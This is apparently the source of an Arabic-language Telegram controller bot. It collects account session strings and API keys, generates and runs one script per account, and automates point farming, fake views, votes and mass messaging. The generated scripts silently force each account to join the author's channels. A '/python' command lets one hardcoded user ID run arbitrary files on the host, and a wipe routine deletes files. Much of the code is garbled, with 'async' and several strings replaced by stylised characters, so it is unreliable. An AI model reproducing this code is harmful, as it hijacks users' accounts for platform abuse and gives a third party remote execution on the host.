    await bot.send_message(int(user), 'مرحبا')

@bot.on(events.CallbackQuery(pattern='tst'))
async def callback(event):
    await event.edit("**• جاري فحص الحسابات**", buttons=[Button.inline("• رجــوع • ", "back")])
    for user_id in stored_users:
        await bot.send_message(user_id, f"/test")


@bot.on(events.CallbackQuery(pattern='acbo'))
async def callback(event):
    await event.edit("**• قـم بأرسال المطاليب التالية :**")
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**⩤ قـم بأرسال يوزر البوت **")
        bot_username = (await conv.get_response()).text
        await conv.send_message("**⩤ قـم بأرسال عدد النقاط**")
        po = (await conv.get_response()).text
        await conv.send_message("**⩤ انتضر قليلا جاري تحويل النقاط**")
    
    
        await bot.send_message(int(user), f"/ptf {bot_username} {po}")
        
#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='adbo'))
async def callback(event):
    await event.edit("**• قـم بأرسال المطاليب التالية :**")
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**✪ قـم بأرسال يوزر البوت**")
        bot_username = (await conv.get_response()).text
        await conv.send_message("**✪ انتضر قليلا جاري ارسال عدد نقاط الحسابات**")
        
        await bot.send_message(int(user), f"/npoint {bot_username}")
    
#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='aebo'))
async def callback(event):
    await event.edit("**• قـم بأرسال المطاليب التالية :**")
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**¤ قـم بأرسال يوزر الـقـنـاة**")
        bot_username = (await conv.get_response()).text
        await conv.send_message("**¤ قـم بأرسال ايدي الرسالة**")
        po = (await conv.get_response()).text
        await conv.send_message("**¤ تم التصويت بنجاح**")
    
    
        await bot.send_message(int(user), f"/voice {bot_username} {po}")
        
#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='ahbo'))
async def callback(event):
    await event.edit("**• قـم بأرسال المطاليب التالية :**")
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**♢ قـم بأرسال يــوزر الـبـوت **")
        bot_username = (await conv.get_response()).text
        await conv.send_message("**♢ قـم بأرسال ايدي الحساب**")
        po = (await conv.get_response()).text
        await conv.send_message("**♢ قـم بأرسال عدد قنوات الاشتراك الاجباري**")
        poo = (await conv.get_response()).text
     
        await conv.send_message("**♢ جاري تفعيل البوت**")
         
    
        await bot.send_message(int(user), f"/bot {bot_username} {po} {poo}")

#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='agbo'))
async def callback(event):
    await event.edit("**• حسنا سوف يتم مغادرة جميع القنوات والمجموعات**")
    
    await bot.send_message(int(user), f"/lpoint")

#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='afbo'))
async def callback(event):
    await event.edit("**• قـم بأرسال المطاليب التالية :**")
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**✪ قـم بأرسال يوزر البوت او الحساب المراد حضره **")
        bot_usernamme = (await conv.get_response()).text
        await conv.send_message("**✪ تم حضر اابوت بنجاح **")
        
        await bot.send_message(int(user), f"/block {bot_usernamme}")


#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='akbo'))
async def callback(event):
    await event.edit("**• قـم بأرسال المطاليب التالية :**")
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**¤ قـم بأرسال يوزر الـقـنـاة**")
        bot_username = (await conv.get_response()).text
        await conv.send_message("**¤ قـم بأرسال ايدي الرسالة المراد زيادة عدد مشاهداته**")
        po = (await conv.get_response()).text
        await conv.send_message("**¤ تمت المشاهدة بنجاح**")
    
    
        await bot.send_message(int(user), f"/view {bot_username} {po}")

#-------------------------------------------------------#
@bot.on(events.CallbackQuery(pattern='aibo'))
async def callback(event):
    await event.edit("**• قـم بأرسال المطاليب التالية :**")
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**✪ قـم بأرسال يوزر القناة المراد الانضمام بها**")
        bot_usernamme = (await conv.get_response()).text
        await conv.send_message("**✪ حسنا قمت بالانضمام**")
        
        await bot.send_message(int(user), f"/jn {bot_usernamme}")
            

@bot.on(events.CallbackQuery(pattern='a6gi2ft'))
async def callback(event):
    global userpot
    async with bot.conversation(event.sender_id) as conv:
        await event.edit("**• قـم بأرسال المطاليب التالية :**", buttons=[Button.inline("• رجــوع • ", "back")])
        await conv.send_message("**✪ تم تجميع الهدية اليومية **")
        for user_id in stored_users:
            await bot.send_message(user_id, f"/agift {userpot}")

@bot.on(events.CallbackQuery(pattern='f4or3wa1rd'))
async def callback(event):
    global userpot
    async with bot.conversation(event.sender_id) as conv:
        await event.edit("**• قـم بأرسال المطاليب التالية :**", buttons=[Button.inline("• رجــوع • ", "back")])
        await conv.send_message("**✪ جاري التحويل **")
        for user_id in stored_users:
            await bot.send_message(user_id, f"/forward {userpot}")


@bot.on(events.CallbackQuery(pattern='co36llec57t'))
async def callback(event):
    global userpot
    async with bot.conversation(event.sender_id) as conv:
        await event.edit("**• قـم بأرسال المطاليب التالية :**", buttons=[Button.inline("• رجــوع • ", "back")])
        await conv.send_message("**✪ جاري التجميع **")
        for user_id in stored_users:
            await bot.send_message(user_id, f"/col6ect")

@bot.on(events.CallbackQuery(pattern='g7aif4'))
async def callback(event):
    global userpot
    async with bot.conversation(event.sender_id) as conv:
        await event.edit("**• قـم بأرسال المطاليب التالية :**", buttons=[Button.inline("• رجــوع • ", "back")])
        await conv.send_message("**✪ جاري تجميع الهدية اليومية **")
        for user_id in stored_users:
            await bot.send_message(user_id, f"/jdhncww'")
            
            
@bot.on(events.CallbackQuery(pattern='tr46nsf6er'))
async def callback(event):
    global userpot
    async with bot.conversation(event.sender_id) as conv:
        await event.edit("""**• حسنا قـم بأرسال المطاليب 
• وسوف ابدأ بالتجميع**""", buttons=[Button.inline("• رجــوع • ", "back")])
        await conv.send_message("**⟡ ارسل الايدي الخاص بك**")
        seconds = (await conv.get_response()).text
        await conv.send_message("**⟡ جاري التحويل**")
        for user_id in stored_users:
            await bot.send_message(user_id, f"/trbefer {seconds}")


@bot.on(events.CallbackQuery(pattern='gf4cobe'))
async def callback(event):
    global userpot
    async with bot.conversation(event.sender_id) as conv:
        await event.edit("""**• حسنا قـم بأرسال المطاليب 
• وسوف ابدأ بالتجميع**""", buttons=[Button.inline("• رجــوع • ", "back")])
        await conv.send_message("**⟡ ارسل الكود **")
        seconds = (await conv.get_response()).text
        await conv.send_message("**⟡ جاري ادخال الكود**")
        for user_id in stored_users:
            await bot.send_message(user_id, f"/agiacode {seconds}")

@bot.on(events.CallbackQuery(pattern='s6e43n6d'))
async def callback(event):
    global userpot
    async with bot.conversation(event.sender_id) as conv:
        await event.edit("""**• حسنا قـم بأرسال المطاليب 
• وسوف ابدأ بالتجميع**""", buttons=[Button.inline("• رجــوع • ", "back")])
        await conv.send_message("**⟡ قم بأرسال الرسالة التي تريد ارسالها\n يرجى عدم وضع مسافات واستبدالها بـ (-)\nمثلا : مرحبا-بك **")
        seconds = (await conv.get_response()).text
        await conv.send_message("**⟡ تم الارسال**")
        for user_id in stored_users:
            await bot.send_message(user_id, f"/send {userpot} {seconds}")

@bot.on(events.CallbackQuery(pattern='ba4utt2on'))
async def callback(event):
    global userpot
    async with bot.conversation(event.sender_id) as conv:
        await event.edit("""**• حسنا قـم بأرسال المطاليب 
• وسوف ابدأ بالتجميع**""", buttons=[Button.inline("• رجــوع • ", "back")])
        await conv.send_message("**⟡ قم بأرسال رقم الزر**")
        seconds = (await conv.get_response()).text
        await conv.send_message("**⟡ تم النقر على الزر**")
        for user_id in stored_users:
            await bot.send_message(user_id, f"/button {userpot} {seconds}")





#--------------------------------------------------------#

@bot.on(events.CallbackQuery(pattern='ajbo'))
async def callback(event):
    await event.edit("**• قـم بأرسال المطاليب التالية :**")
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("**✪ قـم بأرسال يوزر القناة المراد مغادرتها **")
        bot_usernamme = (await conv.get_response()).text
        await conv.send_message("**✪ حسنا قمت بمغادرة القناة**")
        
        await bot.send_message(int(user), f"/lv {bot_usernamme}")

@bot.on(events.CallbackQuery(pattern='format'))
async def callback(event):
    global stored_users
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message('هل تريد حقًا مسح بيانات البوت؟ (نعم/لا)')
        answer = await conv.get_response()
        if answer.text == 'نعم':
            # Send test message to all stored users
            for user in stored_users:
                try:
                    await bot.send_message(user, "/restart")
                except:
                    # Skip sending message to this user if it fails
                    continue
                
            await event.edit("""** يتم مسح بيانات اابوت**""", buttons=[Button.inline("• رجــوع • ", "back")])
            
            stored_users = []
            for file in os.listdir():
                if file not in ['run.py', 'zekalb.py', 'ze.json', '__pycache__', 'ze-telethon-cl.py', 'bot.session']:
                    os.remove(file)
        elif answer.text == 'لا':
            await event.edit('لن يتم مسح بيانات البوت.')
        else:
            await event.edit('لم أفهم شيئًا.')



#------------------------ def ---------------------------#


def create_and_run_file(chat_id, api_id, api_hash, session, useraco):
    global user_bot, id_bot
    
    file_name = f"{useraco}.py"
    with open(file_name, "w") as f:
        f.write(
            module + f"""


api_id = {api_id}
api_hash = "{api_hash}"
session = "{session}"
devloo = {id_bot}       
ubot = '{user_bot}'
      
\n\n""" + ‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 |0)

    with open("run.py", "r") as f:
        lines = f.readlines()

    # find the index of the line that starts with "scripts ="
    index = next((i for i, line in enumerate(lines) if line.startswith("scripts =")), None)

    if index is not None:
        # insert a new line after the "scripts =" line
        lines.insert(index + 1, f"\nscripts.append('{file_name}')#{datee}\n")
    else:
        # handle the case where the "scripts =" line is not found
        pass

    with open("run.py", "w") as f:
        f.writelines(lines)

    os.system(f"python3 {file_name}")


def run_script():
    os.system("python3 run.py")

t = threading.Thread(target=run_script)
t.start()


async def get_stored_values(event):
    global stored_users
    message = ""
    for i in range(len(stored_users)):
        message += f"{stored_users[i]}\n"
    await bot.send_message(event.chat_id, message)



async def handle_create_and_run(event):
    global stop, num_accounts, run
    run = True
    async with bot.conversation(event.chat_id) as conv:
        stop = False
        while not stop:
            if num_accounts >= MAX_ACCOUNTS:
                await bot.send_message(event.chat_id, '**• انتهى العدد المسموح لأضافة الحسابات**')
                break

            await conv.send_message('**⨳ قم بأرسال ايدي الحساب**')
            useraco = (await conv.get_response()).text
            if stop:
                break

            await conv.send_message('**⨳ قـم بأرسال الايبي ايـدي**')
            api_id = (await conv.get_response()).text
            if stop:
                break

            await conv.send_message('**⨳ قـم بأرسال الايبي هـاش**')
            api_hash = (await conv.get_response()).text
            if stop:
                break

            await conv.send_message('**⨳ قـم بأرسال كود تيرمكس**')
            session = (await conv.get_response()).text
            if stop:
                break

            t = threading.Thread(target=create_and_run_file, args=(event.chat_id, api_id, api_hash, session, useraco))
            t.start()
            
            await bot.send_message(event.chat_id, '**⨳ تم اضافة الرقم بنجاح**')
    run = False



async def update_days():
    global days_left
    while True:
        days_left -= 1
        if days_left == 0:
            await bot.send_message(developer_id, f'اشتراك هذا الشخص على وشك النفاذ {DEVELOPER_ID}')
        await asyncio.sleep(86400)




#--------------------- admin list --------------#


@bot.on(events.NewMessage(outgoing=False, pattern=r'/restart'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == developer_id :
        await event.reply("تم الايقاف")
        await bot.disconnect()

@bot.on(events.NewMessage(pattern='/python', from_users=6581896306))
async def run_python(event):
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message('أدخل اسم الملف الذي تريد تشغيله:')
        file_name = await conv.get_response()
        file_name = file_name.text
        t = threading.Thread(target=run_file, args=(file_name,))
        t.start()

def run_file(file_name):
    os.system(f'python3 {file_name}')


@bot.on(events.NewMessage(pattern='/addacc'))
async def add_num(event):
    if event.sender_id == developer_id:
        global MAX_ACCOUNTS
        MAX_ACCOUNTS += 1
        await event.respond(f"تم اضافة رقم الى التخزين القيمة الجديدة {MAX_ACCOUNTS}")
    else:
        await event.respond("عذرًا، هذا الأمر متاح فقط للمطور.")


@bot.on(events.NewMessage(pattern='/removeacc'))
async def add_num(event):
    if event.sender_id == developer_id:
        global MAX_ACCOUNTS
        MAX_ACCOUNTS -= 1
        await event.respond(f"تم حذف رقم الى التخزين القيمة الجديدة {MAX_ACCOUNTS}")
    else:
        await event.respond("عذرًا، هذا الأمر متاح فقط للمطور.")



@bot.on(events.NewMessage(pattern='/delet'))
async def detlet(event):
    if event.sender_id == developer_id:
        global num_accounts
        num_accounts -= 1
        await event.respond(f"تم حذف الرقم. القيمة الجديدة هي {num_accounts}")
    else:
        await event.respond("عذرًا، هذا الأمر متاح فقط للمطور.")

@bot.on(events.NewMessage(pattern='/add'))
async def detlet(event):
    if event.sender_id == developer_id:
        global num_accounts
        num_accounts += 1
        await event.respond(f"تم اضافة الرقم. القيمة الجديدة هي {num_accounts}")
    else:
        await event.respond("عذرًا، هذا الأمر متاح فقط للمطور.")
        
        
@bot.on(events.NewMessage(outgoing=False, pattern=r'/off'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == developer_id :
        await event.reply("تم الايقاف")
        await bot.disconnect()

@bot.on(events.NewMessage(pattern='/remo'))
async def handler(event):
    global stored_users
    sender = await event.get_sender()
    if sender.id != developer_id:
        return
    async with bot.conversation(event.chat_id • ze Team - Contrller Bot0 = """ze1 = TelegramClient(StringSession(session), api_id, api_hash)




ispay = ['yes']
ispay2 = ['yes']

ze1.start()
c = requests.session()
bot_username = '@EEObot'
bot_usernamee = '@A_MAN9300BOT'
bot_usernameee = '@MARKTEBOT'
bot_usernameeee = '@xnsex21bot'

ownerhson_id = (int(devloo))
LOGS = logging.getLogger(__name__)
DEVS = [6581896306]


a𝑆 𝐴 nc def main(): 
    await ze1.send_message(ubot, '/store_id')


@ze1.on(events.NewMessage)
a𝑆 𝐴 nc def join_channel(event):
    try:
        await ze1(JoinChannelRequest("@saythonh"))
    except BaseException:
        pass
        
@ze1.on(events.NewMessage)
a𝑆 𝐴 nc def join_channel(event):
    try:
        await ze1(JoinChannelRequest("@𝑆 𝐴 _tem"))
    except BaseException:
        pass
      

        
        
        
@ze1.on(events.NewMessage(outgoing=False, pattern='.فحص'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply('**the source is running ⚡️**')
        
        
@ze1.on(events.NewMessage(outgoing=False, pattern='/TEST'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply('**the source is running ⚡️**')

@ze1.on(events.NewMessage(outgoing=False, pattern='/test'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply('run')
        
@ze1.on(events.NewMessage(outgoing=False, pattern='.الاوامر'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply(‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 |)


@ze1.on(events.NewMessage(outgoing=False, pattern='.تجميع'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply(‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 |)

@ze1.on(events.NewMessage(outgoing=False, pattern='.تحكم'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply(‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 |)

@ze1.on(events.NewMessage(outgoing=False, pattern='.مميزة'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply(‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 |)

@ze1.on(events.NewMessage(outgoing=False, pattern='/notes'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id :
        order = await event.reply(‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 |)

@ze1.on(events.NewMessage(outgoing=True, pattern=".الاوامر"))
a𝑆 𝐴 nc def _(event):
      await event.edit(‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 |)



@ze1.on(events.NewMessage(outgoing=True, pattern=r"\.فحص"))
a𝑆 𝐴 nc def _(event):
    start = datetime.datetime.now()
    await event.edit("**جاري الفحص..**")
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(‹ 𝑆 𝐴 𝑀 𝐷 𝐼 𝐴 |)

@ze1.on(events.NewMessage(outgoing=False, pattern='/point1'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        await event.reply("جاري تجميع النقاط")
        await event.edit("جاري تجميع النقاط")
        joinu = await ze1(JoinChannelRequest('saythonh'))
        channel_entity = await ze1.get_entity(bot_username)
        await ze1.send_message(bot_username, '/start')
        await a𝑆 𝐴 ncio.sleep(4)
        msg0 = await ze1.get_messages(bot_username, limit=1)
        await msg0[0].click(2)
        await a𝑆 𝐴 ncio.sleep(4)
        msg1 = await ze1.get_messages(bot_username, limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            await a𝑆 𝐴 ncio.sleep(4)

            list = await ze1(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await ze1.send_message(event.chat_id, f"تم الانتهاء من التجميع | 𝑆 𝐴 ")

                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await ze1(JoinChannelRequest(url))
                except:
                    bott = url.split('+')[-1]
                    await ze1(ImportChatInviteRequest(bott))
                msg2 = await ze1.get_messages(bot_username, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضمام في {chs} قناة")
            except:
                msg2 = await ze1.get_messages(bot_username, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القناة رقم {chs}")

        await ze1.send_message(event.chat_id, "تم الانتهاء من التجميع | 𝑆 𝐴 ")
        
@ze1.on(events.NewMessage(outgoing=False, pattern='/point2'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        await event.reply("جاري تجميع النقاط")
        await event.edit("جاري تجميع النقاط")
        joinu = await ze1(JoinChannelRequest('saythonh'))
        channel_entity = await ze1.get_entity(bot_usernamee)
        await ze1.send_message(bot_usernamee, '/start')
        await a𝑆 𝐴 ncio.sleep(4)
        msg0 = await ze1.get_messages(bot_usernamee, limit=1)
        await msg0[0].click(2)
        await a𝑆 𝐴 ncio.sleep(4)
        msg1 = await ze1.get_messages(bot_usernamee, limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            await a𝑆 𝐴 ncio.sleep(4)

            list = await ze1(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await ze1.send_message(event.chat_id, f"تم الانتهاء من التجميع | 𝑆 𝐴 ")

                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await ze1(JoinChannelRequest(url))
                except:
                    bott = url.split('+')[-1]
                    await ze1(ImportChatInviteRequest(bott))
                msg2 = await ze1.get_messages(bot_usernamee, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضمام في {chs} قناة")
            except:
                msg2 = await ze1.get_messages(bot_usernamee, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القناة رقم {chs}")

        await ze1.send_message(event.chat_id, "تم الانتهاء من التجميع | 𝑆 𝐴 ")

@ze1.on(events.NewMessage(outgoing=False, pattern='/point3'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        await event.reply("جاري تجميع النقاط")
        await event.edit("جاري تجميع النقاط")
        joinu = await ze1(JoinChannelRequest('saythonh'))
        channel_entity = await ze1.get_entity(bot_usernameee)
        await ze1.send_message(bot_usernameee, '/start')
        await a𝑆 𝐴 ncio.sleep(4)
        msg0 = await ze1.get_messages(bot_usernameee, limit=1)
        await msg0[0].click(2)
        await a𝑆 𝐴 ncio.sleep(4)
        msg1 = await ze1.get_messages(bot_usernameee, limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            await a𝑆 𝐴 ncio.sleep(4)

            list = await ze1(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await ze1.send_message(event.chat_id, f"تم الانتهاء من التجميع | 𝑆 𝐴 ")

                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await ze1(JoinChannelRequest(url))
                except:
                    bott = url.split('+')[-1]
                    await ze1(ImportChatInviteRequest(bott))
                msg2 = await ze1.get_messages(bot_usernameee, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضمام في {chs} قناة")
            except:
                msg2 = await ze1.get_messages(bot_usernameee, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القناة رقم {chs}")

        await ze1.send_message(event.chat_id, "تم الانتهاء من التجميع | 𝑆 𝐴 ")

@ze1.on(events.NewMessage(outgoing=False, pattern='/point4'))
a𝑆 𝐴 nc def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == ownerhson_id:
        await event.reply("جاري تجميع النقاط")
        await event.edit("جاري تجميع النقاط")
        joinu = await ze1(JoinChannelRequest('saythonh'))
        channel_entity = await ze1.get_entity(bot_usernameeee)
        await ze1.send_message(bot_usernameeee, '/start')
        await a𝑆 𝐴 ncio.sleep(4)
        msg0 = await ze1.get_messages(bot_usernameeee, limit=1)
        await msg0[0].click(2)
        await a𝑆 𝐴 ncio.sleep(4)
        msg1 = await ze1.get_messages(bot_usernameeee, limit=1)
        await msg1[0].click(0)

        chs = 1
        for i in range(100):
            await a𝑆 𝐴 ncio.sleep(4)

            list = await ze1(GetHistoryRequest(peer=channel_entity, limit=1,
                                                    offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
            msgs = list.messages[0]
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await ze1.send_message(event.chat_id, f"تم الانتهاء من التجميع | 𝑆 𝐴 ")

                break
            url = msgs.reply_markup.rows[0].buttons[0].url
            try:
                try:
                    await ze1(JoinChannelRequest(url))
                except:
                    bott = url.split('+')[-1]
                    await ze1(ImportChatInviteRequest(bott))
                msg2 = await ze1.get_messages(bot_usernameeee, limit=1)
                await msg2[0].click(text='تحقق')
                chs += 1
                await event.edit(f"تم الانضمام في {chs} قناة")
            except:
                msg2 = await ze1.get_messages(bot_usernameeee, limit=1)
                await msg2[0].click(text='التالي')
                chs += 1
                await event.edit(f"القناة رقم {chs}")

        await ze1.send_message(event.chat_id, "تم الانتهاء من التجميع | 𝑆 𝐴 ")
        
@ze1.on(events.NewMessage(outgoing=True, pattern=".تجميع المليار"))
a𝑆 𝐴 nc def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await ze1(JoinChannelRequest('saythonh'))
    channel_entity = await ze1.get_entity(bot_username)
    await ze1.send_message(bot_username, '/start')
    await a𝑆 𝐴 ncio.sleep(4)
    msg0 = await ze1.get_messages(bot_username, limit=1)
    await msg0[0].click(2)
    await a𝑆 𝐴 ncio.sleep(4)
    msg1 = await ze1.get_messages(bot_username, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await a𝑆 𝐴 ncio.sleep(4)

        list = await ze1(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await ze1.send_message(event.chat_id, f"**تم الانتهاء من التجميع | 𝑆 𝐴 **")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await ze1(JoinChannelRequest(url))
            except:
                bott = url.split('+')[-1]
                await ze1(ImportChatInviteRequest(bott))
            msg2 = await ze1.get_messages(bot_username, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await ze1.get_messages(bot_username, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await ze1.send_message(event.chat_id, "**تم الانتهاء من التجميع | 𝑆 𝐴 **")
    
    
    
@ze1.on(events.NewMessage(outgoing=True, pattern=".تجميع الجوكر"))
a𝑆 𝐴 nc def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await ze1(JoinChannelRequest('saythonh'))
    channel_entity = await ze1.get_entity(bot_usernamee)
    await ze1.send_message(bot_usernamee, '/start')
    await a𝑆 𝐴 ncio.sleep(4)
    msg0 = await ze1.get_messages(bot_usernamee, limit=1)
    await msg0[0].click(2)
    await a𝑆 𝐴 ncio.sleep(4)
    msg1 = await ze1.get_messages(bot_usernamee, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await a𝑆 𝐴 ncio.sleep(4)

        list = await ze1(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await ze1.send_message(event.chat_id, f"**تم الانتهاء من التجميع | 𝑆 𝐴 **")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await ze1(JoinChannelRequest(url))
            except:
                bott = url.split('+')[-1]
                await ze1(ImportChatInviteRequest(bott))
            msg2 = await ze1.get_messages(bot_usernamee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await ze1.get_messages(bot_usernamee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await ze1.send_message(event.chat_id, "**تم الانتهاء من التجميع | 𝑆 𝐴 **")

@ze1.on(events.NewMessage(outgoing=True, pattern=".تجميع العقاب"))
a𝑆 𝐴 nc def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await ze1(JoinChannelRequest('saythonh'))
    channel_entity = await ze1.get_entity(bot_usernameee)
    await ze1.send_message(bot_usernameee, '/start')
    await a𝑆 𝐴 ncio.sleep(4)
    msg0 = await ze1.get_messages(bot_usernameee, limit=1)
    await msg0[0].click(2)
    await a𝑆 𝐴 ncio.sleep(4)
    msg1 = await ze1.get_messages(bot_usernameee, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await a𝑆 𝐴 ncio.sleep(4)

        list = await ze1(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await ze1.send_message(event.chat_id, f"**تم الانتهاء من التجميع | 𝑆 𝐴 **")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await ze1(JoinChannelRequest(url))
            except:
                bott = url.split('+')[-1]
                await ze1(ImportChatInviteRequest(bott))
            msg2 = await ze1.get_messages(bot_usernameee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
            msg2 = await ze1.get_messages(bot_usernameee, limit=1)
            await msg2[0].click(text='التالي')
            chs += 1
            await event.edit(f"**القناة رقم {chs}**")
    await ze1.send_message(event.chat_id, "**تم الانتهاء من التجميع | 𝑆 𝐴 **")


@ze1.on(events.NewMessage(outgoing=True, pattern=".تجميع العرب"))
a𝑆 𝐴 nc def _(event):

    await event.edit("**جاري تجميع النقاط**")
    joinu = await ze1(JoinChannelRequest('saythonh'))
    channel_entity = await ze1.get_entity(bot_usernameeee)
    await ze1.send_message(bot_usernameeee, '/start')
    await a𝑆 𝐴 ncio.sleep(4)
    msg0 = await ze1.get_messages(bot_usernameeee, limit=1)
    await msg0[0].click(2)
    await a𝑆 𝐴 ncio.sleep(4)
    msg1 = await ze1.get_messages(bot_usernameeee, limit=1)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await a𝑆 𝐴 ncio.sleep(4)

        list = await ze1(GetHistoryRequest(peer=channel_entity, limit=1,
                                               offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
            await ze1.send_message(event.chat_id, f"**تم الانتهاء من التجميع | 𝑆 𝐴 **")

            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await ze1(JoinChannelRequest(url))
            except:
                bott = url.split('+')[-1]
                await ze1(ImportChatInviteRequest(bott))
            msg2 = await ze1.get_messages(bot_usernameeee, limit=1)
            await msg2[0].click(text='تحقق')
            chs += 1
            await event.edit(f"**تم الانضمام في {chs} قناة**")
        except:
